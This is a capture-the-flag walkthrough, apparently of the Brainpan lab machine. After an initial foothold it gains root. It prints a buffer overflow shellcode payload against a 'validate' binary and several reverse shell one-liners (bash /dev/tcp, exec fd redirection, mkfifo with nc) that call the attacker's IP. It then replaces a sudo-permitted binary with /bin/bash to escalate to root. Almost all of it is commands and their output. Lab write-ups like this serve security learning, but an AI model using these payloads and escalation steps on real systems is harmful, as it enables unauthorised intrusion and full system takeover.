
after exploit is run we have a very limited shell, no backspace, no crtl+..
we tried a lot of stuff to fit this and failed (for learning)
then we just deleted the sudo binary anansi_util and copied /bin/bash to that name

```sh
┌──(kali㉿kali)-[~/bof]
└─$ nc -nvlp 444
listening on [any] 444 ...
connect to [10.21.31.111] from (UNKNOWN) [10.10.201.76] 41997
/usr/local/bin/validate $(python -c "print('\xd9\xc0\xbf\xef\x8d\xf2\xb8\xd9\x74\x24\xf4\x5e\x33\xc9\xb1\x0b\x31\x7e\x1a\x03\x7e\x1a\x83\xc6\x04\xe2\x1a\xe7\xf9\xe0\x7d\xaa\x9b\x78\x50\x28\xed\x9e\xc2\x81\x9e\x08\x12\xb6\x4f\xab\x7b\x28\x19\xc8\x29\x5c\x11\x0f\xcd\x9c\x0d\x6d\xa4\xf2\x7e\x02\x5e\x0b\xd6\xb7\x17\xea\x15\xb7'+'A'*46+'\xaf\x84\x04\x08')")
id
uid=1002(puck) gid=1002(puck) euid=1001(anansi) groups=1001(anansi),1002(puck)
ls -la
ls: cannot open directory .: Permission denied
cd ..
ls -la
total 20
drwxr-xr-x  5 root    root    4096 Mar  4  2013 .
drwxr-xr-x 22 root    root    4096 Mar  4  2013 ..
drwx------  4 anansi  anansi  4096 Mar  4  2013 anansi
drwx------  7 puck    puck    4096 Mar  6  2013 puck
drwx------  3 reynard reynard 4096 Mar  4  2013 reynard
cd anansi
ls -la
total 32
drwx------ 4 anansi anansi 4096 Mar  4  2013 .
drwxr-xr-x 5 root   root   4096 Mar  4  2013 ..
-rw------- 1 anansi anansi    0 Mar  5  2013 .bash_history
-rw-r--r-- 1 anansi anansi  220 Mar  4  2013 .bash_logout
-rw-r--r-- 1 anansi anansi 3637 Mar  4  2013 .bashrc
drwx------ 2 anansi anansi 4096 Mar  4  2013 .cache
-rw------- 1 root   root     39 Mar  4  2013 .lesshst
-rw-r--r-- 1 anansi anansi  675 Mar  4  2013 .profile
drwxrwxr-x 2 anansi anansi 4096 Mar  5  2013 bin
cd
ls
bin
bash -i >& /dev/tcp/10.21.31.111/443 0>&1
/bin/sh: 10: Syntax error: Bad fd number
pwd
/home/puck
id
uid=1002(puck) gid=1002(puck) groups=1002(puck)
/usr/local/bin/validate $(python -c "print('\xd9\xc0\xbf\xef\x8d\xf2\xb8\xd9\x74\x24\xf4\x5e\x33\xc9\xb1\x0b\x31\x7e\x1a\x03\x7e\x1a\x83\xc6\x04\xe2\x1a\xe7\xf9\xe0\x7d\xaa\x9b\x78\x50\x28\xed\x9e\xc2\x81\x9e\x08\x12\xb6\x4f\xab\x7b\x28\x19\xc8\x29\x5c\x11\x0f\xcd\x9c\x0d\x6d\xa4\xf2\x7e\x02\x5e\x0b\xd6\xb7\x17\xea\x15\xb7'+'A'*46+'\xaf\x84\x04\x08')")
id
uid=1002(puck) gid=1002(puck) euid=1001(anansi) groups=1001(anansi),1002(puck)
0<&196;exec 196<>/dev/tcp/10.21.31.111/443; sh <&196 >&196 2>&196
/bin/sh: 3: Syntax error: Bad fd number
id
uid=1002(puck) gid=1002(puck) groups=1002(puck)
/usr/local/bin/validate $(python -c "print('\xd9\xc0\xbf\xef\x8d\xf2\xb8\xd9\x74\x24\xf4\x5e\x33\xc9\xb1\x0b\x31\x7e\x1a\x03\x7e\x1a\x83\xc6\x04\xe2\x1a\xe7\xf9\xe0\x7d\xaa\x9b\x78\x50\x28\xed\x9e\xc2\x81\x9e\x08\x12\xb6\x4f\xab\x7b\x28\x19\xc8\x29\x5c\x11\x0f\xcd\x9c\x0d\x6d\xa4\xf2\x7e\x02\x5e\x0b\xd6\xb7\x17\xea\x15\xb7'+'A'*46+'\xaf\x84\x04\x08')")
id
uid=1002(puck) gid=1002(puck) euid=1001(anansi) groups=1001(anansi),1002(puck)
mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.21.31.111 443 > /tmp/f

mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.21.31.111 443 > /tmp/f
mkfifo: cannot create fifo `/tmp/f': File exists
mkfifo /tmp/g; cat /tmp/g | /bin/sh -i 2>&1 | nc 10.21.31.111 443 > /tmp/g
mkfifo /tmp/h; cat /tmp/h | /bin/sh -i 2>&1 | nc 10.21.31.111 443 > /tmp/h

```

we use the mkfifo only to get backspace, still no ctrl+.. so we could open nano but then not even exit

```sh
$ cd ../anansi/bin
$ ls -la
total 908
drwxrwxr-x 2 anansi anansi   4096 Feb  3 03:41 .
drwx------ 4 anansi anansi   4096 Mar  4  2013 ..
-rwxr-xr-x 1 anansi puck   920796 Feb  3 03:41 anansi_util
$ rm anansi_util
$ ls -la
total 8
drwxrwxr-x 2 anansi anansi 4096 Feb  3 03:38 .
drwx------ 4 anansi anansi 4096 Mar  4  2013 ..
$ cp /bin/bash anansi_util
$ ls -la
total 908
drwxrwxr-x 2 anansi anansi   4096 Feb  3 03:41 .
drwx------ 4 anansi anansi   4096 Mar  4  2013 ..
-rwxr-xr-x 1 anansi puck   920796 Feb  3 03:41 anansi_util
$ sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
$ sudo /home/anansi/bin/anansi_util
id
uid=0(root) gid=0(root) groups=0(root)
```

we can also now run this in an upgraded shell for pack as both users have the sudo permission
```sh
mkfifo /tmp/h; cat /tmp/h | /bin/sh -i 2>&1 | nc 10.21.31.111 443 > /tmp/h
id
uid=1002(puck) gid=1002(puck) euid=1001(anansi) groups=1001(anansi),1002(puck)
exit
sudo -i
sudo: no tty present and no askpass program specified
python3 -c 'import pty;pty.spawn("/bin/bash")'
puck@brainpan:/home/puck$ ls -la
ls -la
total 52
drwx------ 7 puck puck 4096 Mar  6  2013 .
drwxr-xr-x 5 root root 4096 Mar  4  2013 ..
-rw------- 1 puck puck 1520 Feb  3 03:18 .bash_history
-rw-r--r-- 1 puck puck  220 Mar  4  2013 .bash_logout
-rw-r--r-- 1 puck puck 3637 Mar  4  2013 .bashrc
drwx------ 3 puck puck 4096 Mar  4  2013 .cache
drwxrwxr-x 3 puck puck 4096 Mar  4  2013 .config
-rw------- 1 puck puck   55 Mar  5  2013 .lesshst
drwxrwxr-x 3 puck puck 4096 Mar  4  2013 .local
-rw-r--r-- 1 puck puck  675 Mar  4  2013 .profile
drwxrwxr-x 4 puck puck 4096 Feb  3 03:22 .wine
-rwxr-xr-x 1 root root  513 Mar  6  2013 checksrv.sh
drwxrwxr-x 3 puck puck 4096 Mar  4  2013 web
puck@brainpan:/home/puck$ sudi -l
sudi -l
No command 'sudi' found, did you mean:
 Command 'sudo' from package 'sudo' (main)
 Command 'sudo' from package 'sudo-ldap' (universe)
sudi: command not found
puck@brainpan:/home/puck$ sudo -l
sudo -l
Matching Defaults entries for puck on this host:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
puck@brainpan:/home/puck$ sudo /home/anansi/bin/anansi_util
sudo /home/anansi/bin/anansi_util
root@brainpan:/home/puck# id
id
uid=0(root) gid=0(root) groups=0(root)
root@brainpan:/home/puck# 
```